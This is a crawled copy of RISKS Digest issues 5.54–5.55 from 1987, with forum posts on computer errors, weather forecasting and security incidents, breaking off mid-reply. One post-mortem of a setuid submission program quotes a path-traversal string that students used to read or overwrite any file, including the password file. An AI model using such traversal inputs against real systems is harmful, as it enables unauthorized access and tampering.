<A HREF="/Risks/5.54.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-6</DOCNO>
<DOCOLDNO>IA012-000130-B021-307</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.54.html 128.240.150.127 19970217014002 text/html 14918
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:38:33 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 54</TITLE>
<LINK REL="Prev" HREF="/Risks/5.53.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.55.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.53.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.55.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 54</H1>
<H2> Wednesday, 4 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Erroneous $1M overdraft -- plus interest 
</A>
<DD>
<A HREF="#subj1.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Wrongful Traffic Tickets &amp; Changing Computers 
</A>
<DD>
<A HREF="#subj2.1">
David A. Honig
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Weather -- or not to blame the computer? 
</A>
<DD>
<A HREF="#subj3.1">
Stephen Colwill
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Computer's Normal Operation Delays Royal Visit 
</A>
<DD>
<A HREF="#subj4.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Auto-pilot Problems and Hardware Reliability 
</A>
<DD>
<A HREF="#subj5.1">
Craig Johnson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Minuteman III 
</A>
<DD>
<A HREF="#subj6.1">
Bryce Nesbitt
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Erroneous $1M overdraft -- plus interest
</A>
</H3>
<address>
Dave Horsfall
&lt;<A HREF="mailto:munnari!astra.necisa.oz.au!dave@uunet.UU.NET ">
munnari!astra.necisa.oz.au!dave@uunet.UU.NET 
</A>&gt;
</address>
<i>
4 Nov 87 13:13:34 +1100 (Wed)
</i><PRE>

From the Sydney Sun-Herald, 19th October 1987:

``The bank manager panicked when he saw the size of Brian Jamieson's
overdraft - all $100 million of it!  To add to the horror, an
additional $53,000 interest debt was accruing daily on the account.

But Mr Jamieson ... was the last to panic, thanks to a frantic
telephone call from his Westpac bank manager who told him to take
no notice of any statement - it was all a mistake.  [...]

The bank manager said he was not sure how the error had occurred.
"Something happened with the computer and it went through" he said.  [...]

Curiosity has since got the better of Mr Jamieson.  He has requested
a copy of the offending bank statement so he can frame it.

Dave Horsfall  (VK2KFU)        ACS:  dave@astra.necisa.OZ.AU
NEC Information Systems Aust.  ARPA: dave%astra.necisa.OZ.AU@uunet.UU.NET
3rd Floor, 99 Nicholson St     UUCP: {enea,hplabs,mcvax,uunet,ukc}!\
St. Leonards NSW 2064 AUSTRALIA       munnari!astra.necisa.OZ.AU!dave

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Wrongful Traffic Tickets &amp; Changing Computers
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Mon, 02 Nov 87 11:50:02 -0800
From: "David A. Honig" &lt;honig@CIP.UCI.EDU&gt;

A month ago, I received a notice stating that I had two outstanding parking
tickets (delivered on successive days) for violations occuring in UC Irvine
parking lots, and that if I didn't pay over $100 I would have a warrant out
for my arrest.  As I didn't know about the tickets, I made some phone calls
and was told to send the tickets to the Parking &amp; Transportation office here.

Today I called them to find out what my status was.  I told them the date of
the citation, and was told "just to trash them".  They claimed it was a
"computer error".  I asked them for more details: they had "changed computer
companies" and the new system had different codes, causing paid tickets look
unpaid and vice-versa, and confusing other information besides (apparently
including sending out tickets to the wrong people).  The person on the phone
told me that they had to erase three month's worth of tapes due to these
problems.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Weather -- or not to blame the computer?
</A>
</H3>
<address>
Stephen Colwill 
&lt;<A HREF="mailto:mcvax!praxis!steve@uunet.UU.NET">
mcvax!praxis!steve@uunet.UU.NET
</A>&gt;
</address>
<i>
Mon, 2 Nov 87 13:17:35 BST
</i><PRE>

I would like to make some observations on the subject of the recent storm.

The remarks about mesoscale weather systems seem to be relevant though I was
under the impression that the model used by the Met Office took into account
surface features (mountains etc) so it cannot be completely restricted to high
altitude (and therefore large-scale) effects.

The paucity of weather stations in the sea is a difficulty that the
forecasters have to live with, almost all the weather that England has builds
over the Atlantic and it seems to me that ships caught in a system like that
are going to have more problems to deal with then relaying detailed data on
the atmospheric conditions to the mainland. This situation is distinct from
those countries with a continental weather pattern and poses more problems for
the modellers.

Another point worth noting is that in this country we are not really "geared
up" to such unusual weather, whenever there are severe snowstorms for example
the parts of the country affected are generally brought to a complete
standstill. In America, on the other hand, a whole infrastructure exists for
closely monitoring the progress of hurricanes etc, and the people are prepared
(as far as they can be) for them.

On the storm itself, it seems to have followed a rather peculiar path of
evolution. As I understand from the subsequent reports it started as two
centres of depression which amalgamated suddenly in the Bay of Biscay. After
this point it reached its unprecedented violence, up to this point the
depressions would have been on the nasty side of normal. These depressions
were fuelled by colliding air masses which had a high temperature difference.
Any model which could have predicted *that* gets *my* respect. In its new
state the storm was so energetic that (on the scale of the Paris-London
distance) it could have gone anywhere and only swung over the SE of England at
the last moment.

A consequence of the storm was that the power loss in the SE significantly
disrupted network communication overseas since ukc (I guess) had some power
outages. 

In my opinion, these observations completely exonerate the model-makers and
their machines. If this storm had been predicted there would have been a good
case, on the other hand, for their extensive congratulation.

There is a body of thought that has it that such violent weather is on the
increase as the average land-sea temperature difference increases (the
greenhouse effect apparently) so it seems that computer models will have to
get to grips with it eventually :-)

Steve Colwill, Praxis, Bath, England.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Computer's Normal Operation Delays Royal Visit
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Tue, 3 Nov 87 13:59:08 EST
</i><PRE>

  &gt; ... As the royal party was early, the control room dispatched
  &gt; the train manually rather than keep Her Majesty waiting for five minutes.

It's noteworthy that this means that the ultimate cause of the foulup was
elsewhere.  The royal party is not supposed to arrive early.  One reason why
the Queen's Flight aircraft always carry navigators (not normally found on
civil aircraft nowadays) is that their arrivals must be precisely on time --
neither late *nor* early.
				Henry Spencer @ U of Toronto Zoology
				{allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Auto-pilot Problems and Hardware Reliability
</A>
</H3>
<address>
Craig Johnson
&lt;<A HREF="mailto:vince@tc.fluke.COM ">
vince@tc.fluke.COM 
</A>&gt;
</address>
<i>
Tue, 3 Nov 87 10:55:01 PST
</i><PRE>
Organization: John Fluke Mfg. Co., Inc., Everett, WA

The discussion about alleged auto-pilot failures has reminded me of a
discovery I made a few years ago with regard to hardware reliability
which has serious implications for many applications and may certainly
be a risk to many people.

I was involved at the time with a design which used a very common,
inexpensive single-chip processor made by a major manufacturer.  My
application was such that I was able to observe the behavior of this
processor when very frequently reset with an asynchronous signal, on
the order of 10-50 times a second.  Even though the manufacture's
literature claimed that the reset input was asynchronous and even had
schmitt-trigger-like conditioning, much to my consternation I found
that once every few minutes the processor would go crazy and my system
would hang.

After much hair pulling and careful scrutiny, I found that indeed once
in a great while a reset would fail to properly initialize the
processor and the thing would actually start fetching code at some
bogus address rather than at its reset address.  The failure was
duplicated with several different processor chips, confirming that the
behavior was a characteristic of that processor.  Synchronizing the
reset signal to the bus cycle completely cured the problem and it was
never seen again.

It may be conjecture, but my conclusion was that this was a classic
case of meta-stable states in flip-flops.  Regardless of the
schmitt-trigger conditioning, there was an internal latch which was
supposed to sample the reset input which if clocked at just the right
moment during the transition of the reset signal would go meta-stable,
"balanced" between states and slow to "fall" to a valid state.  When
the transition was too slow, incorrect and incomplete processor
initialization would take place.

I felt fortunate to have discovered this flaw in the processor behavior
before my application went to market.  I have often wondered how many
other systems out there suffer from the same kind of flaw and are prone
to unexplained failures "one in a thousand" times.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Minuteman III (<A HREF="/Risks/5.53.html">RISKS-5.53</A>)
</A>
</H3>
<address>
Bryce Nesbitt
&lt;<A HREF="mailto:bryce%hoser.Berkeley.EDU@Berkeley.EDU ">
bryce%hoser.Berkeley.EDU@Berkeley.EDU 
</A>&gt;
</address>
<i>
Wed, 4 Nov 87 00:46:19 PST
</i><PRE>
Organization: University of California at Berkeley

&gt;RISKS-LIST: RISKS-FORUM Digest  Monday, 2 November 1987  Volume 5 : Issue 53
&gt;
&gt;In regards to the post that talked about parking a vehicle on top of a
&gt;Minuteman III silo to prevent it's launch...
&gt;...If that did indeed occur, it would be questionable
&gt;to it's effect. The silo door is approximately 5 feet of hardened
&gt;concrete and is designed to open even when buried under a substantial
&gt;amount dirt and rubble.

The local journal of mis-information claims that the truck was
parked oriented in the direction of door opening with the brakes
off.  The theory was that the "rug", so to speak, would be pulled
out from under the vehicle which would drop and damage the missile.

The net result might range from launch failure, to fireball,
to local radioactive contamination (or even local detonation,
just possibly).  Any of those alternatives would be better than
dropping a nuke on some *other* country.

Rather than just spread this rumor, I'd rather hear from someone
who knows about how this silo door is designed to keep "a substantial
amount of dirt and rubble" from falling into the silo.

Assume the contingency that the silo commanders must have faced...
an electrical malfunction that they felt *might* cause an unintended
launch, no matter how unreasonable you may think that is.

   [Marginally relevant, but it has intriguing systems implications!

   Bryce's subtle comment of appending the results -- which I have omitted 
   here -- of a spelling corrector applied to <A HREF="/Risks/5.53.html">RISKS-5.53</A> suggests that the
   spelling in that issue was execrable.  (And of course his spelling corrector
   missed the two "it's" above.)  In case you haven't noticed, I have eased
   up somewhat in trying to correct contributed typos and grammatical
   horrors.  (It should reflect on the author, not on me?)  But I certainly
   echo the implied grumble that the contributed writings are getting
   sloppy.  I try not to squelch an interesting contribution just because of
   its writing, but please remember the word "coherent" in the masthead.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.53.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.55.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-7</DOCNO>
<DOCOLDNO>IA012-000130-B021-327</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.55.html 128.240.150.127 19970217014018 text/html 29112
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:38:43 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 55</TITLE>
<LINK REL="Prev" HREF="/Risks/5.54.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.56.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.54.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.56.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 55</H1>
<H2> Thursday, 5 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Phone prefix change cuts BBN off from world 
</A>
<DD>
<A HREF="#subj1.1">
David Kovar
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  A simple application of Murphy's Law 
</A>
<DD>
<A HREF="#subj2.1">
Geoff Lane
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Wrongful Accusations; Weather 
</A>
<DD>
<A HREF="#subj3.1">
Willis Ware
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Weather and expecting the unexpected 
</A>
<DD>
<A HREF="#subj4.1">
Edmondson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  UNIX setuid nasty -- watch your pathnames 
</A>
<DD>
<A HREF="#subj5.1">
Stephen Russell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Penetrations of Commercial Systems 
</A>
<DD>
<A HREF="#subj6.1">
TMP Lee
</A><br>
<A HREF="#subj6.2">
 PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Unix password encryption, again? 
</A>
<DD>
<A HREF="#subj7.1">
Dan Hoey
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Software Testing 
</A>
<DD>
<A HREF="#subj8.1">
Danny Padwa
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Risks of using mailing lists 
</A>
<DD>
<A HREF="#subj9.1">
Dave Horsfall
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Phone prefix change cuts BBN off from world
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 05 Nov 87 15:46:11 -0500
From: dkovar@VAX.BBN.COM

  On the first of November, BBN in Cambridge MA acquired a new prefix to
replace it's three old prefixes. Any calls to the old numbers were supposed
to get a message informing the caller of the new number. Standard stuff.
Well, perhaps not quite. The following messages were culled from the
corporate bboard. Corporate and personal risks abound. "Has BBN gone out of
business?" "Oh, you gave us a false work number, that's grounds for a lawsuit."
"I've been trying to reach you all day to inform you that ....". 

-David Kovar

  I have been having problems with people reaching me at my new 873 number.
  It turn out that this seems not to be a fault of the tel company or our PBX
  but not-up-to-date data-base of phone exchanges in the caller's PBX. The 873
  extension is new to Cambridge! An interesting distributed data-base problem..
  ----------
  As noted in an earlier bboard posting, BBN's new number has to be distributed
  to a lot of telephone switches.  Errors in the distribution can be fixed, but
  only if the BBN folks in charge of voice communications get involved.  So, if
  you learn that anyone is having trouble calling BBN, it would be helpful if 
  you would report this to Curt D'Aguanno (ext. 3845, email "cdaguanno"); he 
  will need to know where the caller is calling from, and what carrier they 
  are using (AT&amp;T, MCI, ...) if you know.
  
  Please note that the distribution of our new number is really outside of 
  BBN's control; all Curt can do is report the problem to the carrier in an 
  "official" way and keep after the carrier to fix the problem.
  ----------
  NOT ONLY DO SOME NUMBERS NOT WORK, BUT WHEN YOU CALL THE OLD NUMBERS,
  THE RECORDING SAYS THAT THE NUMBER IS OUT OF SERVICE, CALL YOUR
  OPERATOR FOR HELP.  I CALLED HER, SHE SAID CALL INFORMATION FOR THE
  NEW NUMBER.  INFORMATION SAID CALL SOMEONE ELSE,...
  IN OTHER WORDS, IF SOMEONE YOU KNOW TRYS TO CALL YOU AT YOUR OLD 
  NUMBER, TOO BAD!
  ----------
  My daughter's school has been trying to call me all day to tell me she is
  very sick.  But anyone who tries a 497 BBN number gets a NOT IN SERVICE
  message, and calling Information gets no information.  Help!  Is something
  being done about this, hopefully VERY quickly?  It's difficult to imagine
  how much BBN is losing every hour.  I just called a client who said he'd been
  trying to reach me since this morning and wondered when BBN had gone out of
  business.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
   A simple application of Murphy's Law
</A>
</H3>
<address>
"ZZASSGL" 
&lt;<A HREF="mailto:ZZASSGL@CMS.UMRCC.AC.UK">
ZZASSGL@CMS.UMRCC.AC.UK
</A>&gt;
</address>
<i>
Thu, 05 Nov 87 11:43:14 GMT
</i><PRE>

I look forward to reading all the various complicated ways in which computers 
can screw up your life in this forum. There are however some very simple
examples of Murphys Law. The following has just happened to me AND I AM ANGRY!

We received on Tuesday a tape from Purdue University (I mention this because
I'm in Manchester, England).  This tape I entered into our "Stranger Tape"
system where it was allocated a tape number and two big sticky labels were
placed on the reel showing the tape number to anybody who cared to read
them. The tape is then placed into the tape racks.  I successfully read all
the data from the tape.  Today, Thursday, I realize that there are in fact
some corruptions in one of the files that I read. So I attempt to re-read
the file from the tape.  This turns out to be impossible because sometime on
Wednesday an operator misread the tape number on the big sticky labels and
mounted my tape instead of the correct one and wrote someone's files onto it.

This occurred on a MVS system and the tape contained a standard label.  When
you attempt to overwrite a labeled tape on our system an operator message
appears asking if you really want to write to the tape. The operator must
have answered yes to this question.

This is of course an example of the seeing, hearing, reading what you expect
to see, hear or read rather than what is actually there. There appears to be
nothing that you can do to prevent this kind of error.  The system had
correctly diagnosed that there was a problem of some sort and asked for
assistance to resolve the matter. It was told to carry on and write to the
file.

The consequences of this little screwup are: I may have to request a new
tape to be sent from Purdue (24 dollars postage a time); I now have access
to someone's files as the physical tape is still registered to me and I can
remove it from the tape library by returning the receipt; someone has lost
their files without any evidence to show why.

Geoff Lane, University of Manchester Regional Computer Centre

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Wrongful Accusations; Weather (<A HREF="/Risks/5.54.html">RISKS-5.54</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:willis@rand-unix.ARPA">
willis@rand-unix.ARPA
</A>&gt;
</address>
<i>
Thu, 05 Nov 87 09:32:01 PST
</i><PRE>

RE:  Wrongful Traffic Tickets &amp; Changing Computers (David A. Honig)

It's OK to have someone tell you over the phone to ignore some allegedly
wrongful action of a computer-based system.  But do you trust the phone
message?  And do you trust the person telling you the message?  And do
you believe that the person indeed knows the correct and complete facts?

At one time I was suspected of fraudulently using my bank card.  After it
got straightened out, I insisted on an explanation.  It took two letters to
the bank president to get it.

Turns out that the bank issued both MC and VISA cards, and -- get this --
used the same numerical identification sequences for both.  I had a VISA;
an MC card of the same number had been lost and fraudulently used.  A data
entry clerk goofed on the digits which distinguish an MC from a VISA and I
got in the barrel.

Through my insistence on an explanation, the bank took corrective action
to avoid future similar problems.

For events beyond some threshold, the potential consequences of some
action alleged to be wrong are too RISKy to depend on phone notification.
It's your individual call when to insist on a written verification, but my
personal threshold is very low.  Only for the most trivial of events will
I accept phone statements.

					Willis H. Ware, Santa Monica, CA

      - - - - - - - - - - - - - - - - - - - - - - - - - - - -

RE: Weather -- or not to blame the computer? (Stephen Colwill)

Just a few other comments to wrap the subject up.  Maybe SE Britain isn't
geared up for serious weather, but neither is the U.S. in some ways.  In
spite of best efforts, we often screw it up.  Example: as a result of a
forecast that indicated only light snow, the Washington (D.C.) government
delayed calling out the snow equipment for an hour or so.  The snow was
heavy, not light, and the city came to a half.

Also turns out that the most critical forecast that the NOAA Severe
Weather Forecast Center (in the midwest somewhere) has to make for a
hurricane is prediction of its landfall location.  It's a tricky judgment,
and the WX folks try to get the best and continuous data on the storm.
But since the on-shore preparation time is measured in hours, the storm
can dance around considerably in the last few hours and hence we have the
occasional situation of prepared areas not being hit and unprepared areas,
clobbered.

Re weather data over the North Atlantic, NOAA experimented a few years
back with a package that flew in the hold of trans-Atlantic aircraft and
continuously reported weather observations at jet altitudes through the
GOES satellite back to Suitland, Maryland.  As I recall the argument, the
weight of the package cost the airline the revenue of one passenger seat
(maybe it was two or three seats) so the experiment was short-lived.  I do
not know its present status.

					Willis H. Ware, Santa Monica, CA

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 Weather and expecting the unexpected
</A>
</H3>
<address>
&lt;<A HREF="mailto:    EDMONDSON@COMP-V1.BHAM.AC.UK">
    EDMONDSON@COMP-V1.BHAM.AC.UK
</A>&gt;
</address>
<i>
5-NOV-1987 12:33:37
</i><PRE>

It is worth commenting on Stephen Colwill's comment that in the USA everyone
is geared up to watch the weather, respond appropriately, or better still
anticipate, and in any case their larger land mass makes weather prediction
easier.... which I take to be the drift of his contribution.

The winter of '82 will be remembered by inhabitants of Minnesota.  Just after
Christmas the airport was closed (for nearly 24 hours, first time in 20 years,
if my memory serves me well)  -  by a freak, and unforecasted, snow fall.
Not just a few flakes, you understand - Minnesota folk are hardy stock - but
more than a foot of snow in a few hours, in the middle of the night.

I know, because I couldn't get back to Minneapolis, and when I did everyone
expressed surprise at being caught out, etc.  Note that Minneapolis has/had
the advantage of the KSTP weather-desk in addition to any national forecasts,
and that Minneapolis is just about centrally located in a huge land-mass.
The Norwegian bachelor farmers no doubt munched on their powder-milk biscuits,
but everyone else felt let down.

I add this to the debate because the usual British arguments  -  we don't
suffer extremes frequently enough (the usual complaint of railway service
when the points (switches) freeze, as they do most winters), we're too small
for good predictions, etc., just don't add up.

The moral - and comments welcomed on this - would surely be something along
the lines of: people are not psychologically prepared for extremes, of any
sort, and thus don't countenance them readily.  What this means for RISKS
is that we (designers of expert systems, or autopilots, or...) need to be
aware that it is at the margins of human experience that our experience
fails us!  We're least able to contribute the design data for those areas
of performance where they are most needed.

OK so someone is going to bring up Three Mile Island - fine  -  but note that
I'm note restricting my comments to simple monitoring failures, or to pressures
of time, etc.  A fly or two on the Met. Office walls may well have heard
comments to the effect that 'this looks like a hurricane - but surely not
here' or some such.  Does anyone know of observational or other studies on
this aspect of human behaviour - it is particularly relevant to understanding
human response to data provided by computers when those data are unusual,
and thus potentially a component in a risky situation?

          [Readers may recall our mention of the notion of Henry Petroski 
          ("To Err is Human") that we tend no to learn from our successes,
          but have a great opportunity to learn from our failures.  PGN]
    
</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
UNIX setuid nasty -- Watch your pathnames
</A>
</H3>
<address>
Stephen Russell
&lt;<A HREF="mailto:munnari!basser.cs.su.oz.au!steve@uunet.UU.NET ">
munnari!basser.cs.su.oz.au!steve@uunet.UU.NET 
</A>&gt;
</address>
<i>
5 Nov 87 02:10:40 GMT
</i><PRE>
Organization: Dept of Comp Sci, Uni of Sydney, Australia

A major security bug in our student assignment submission system was exposed
recently. This system, which allows students to submit solutions for
selected assignments, consists of two programs. The first checks that
the assignment is current, etc., then constructs the file pathnames for
the student's file and the destination (in the appropriate directory for
that assignment). It then invokes the second program, which is basically
a setuid root file copy program. It needs to be setuid root, as it writes
into a protected directory. The copy program is publicly executable, although
(we believed) reasonably well hidden.

Now for the bug. The copy program attempts to prevent incorrect use,
by checking that the pathname for the destination begins with
"/user1/bags/GIVE/", which is the standard place for putting assignments.
However, _it checks no more than that_. It didn't take too long for
some students to discover that "/user1/bags/GIVE/../../.." was also
acceptable. This allowed them to `back up' out of the correct directory to
the root directory, and from there to anywhere they liked!

Thus, they had a program that allowed them to read or overwrite any file
on the system. You can imagine the consequences - modified password file,
trojan horses installed in various system utilities, etc. When we finally
discovered this, it took many, many hours to clean up the mess. Worst of all,
we cannot be 100% sure we haven't missed something.

Moral: breaking normal security to provide a needed feature is a risk.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 Penetrations of Commercial Systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:TMPLee@DOCKMASTER.ARPA">
TMPLee@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Fri, 30 Oct 87 14:18 EST
</i><PRE>
To: risks@csl.sri.com
Cc: DParker@KL.SRI.COM

Does anyone know if there exists, apart from Donn Parker's publications,
any compendium of recent (last ten years) cases of theft, fraud, or
unauthorized disclosure, modification, or destruction of information in
commercial computer systems (analogous government ones OK too) wherein
it is at least plausible that better computer security would have
prevented, or helped detect (sooner?)  the incident?  (I'm also aware of
PGN's lists too, of course.)  ("better computer security" means
technical measures, except for pure physical security and communications
security, if weaknesses in those was only exploited in a direct attack
on the end information -- if they were exploited as part of an indirect
attack (e.g., stealing a password, planting modified software) that
would be of interest.)

(Individual reports also welcome; don't send them directly to either forum.)

Ted

</PRE>
<HR><H3><A NAME="subj6.2">
Re: Penetrations of Commercial Systems
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.Com">
Neumann@KL.SRI.Com
</A>&gt;
</address>
<i>
Sat 31 Oct 87 15:51:12-PST
</i><PRE>
To: TMPLee@DOCKMASTER.ARPA
Cc: risks@csl.sri.com, DParker@KL.SRI.Com

Ted, I presume you are fishing for justifications for better system security
and network security in the face of many people trying to argue that most
breakins are not the result of poor system security, but rather weaknesses
in the administrative, operational, and user practice.  That argument needs
attacking.  Having better systems with more humane interfaces and with
nonbypassable and nontamperable auditing could help to diminish the sloppy
practice.  But having a system with inadequate security and integrity means
that the audit trails -- and indeed some of the system controls themselves
-- can be readily compromised.  Also, many of the external breakins and
internal misuses have been inspired by system weaknesses -- even if they
resulted directly from sloppy practice.

One particularly horrible case involved administratively turning off the
audit trail in order to permit the computer systems to cope with the backlog:

$H Removal of Wall St audit trail enables $28.8M computer fraud (SEN 12 4)

But suitably efficient, nonbypassable, and nontamperable audit trails are
included under the notion of adequate security controls; certain minimum
level of auditing should not be possible to turn off.

Following are just a few cases in which better system security controls
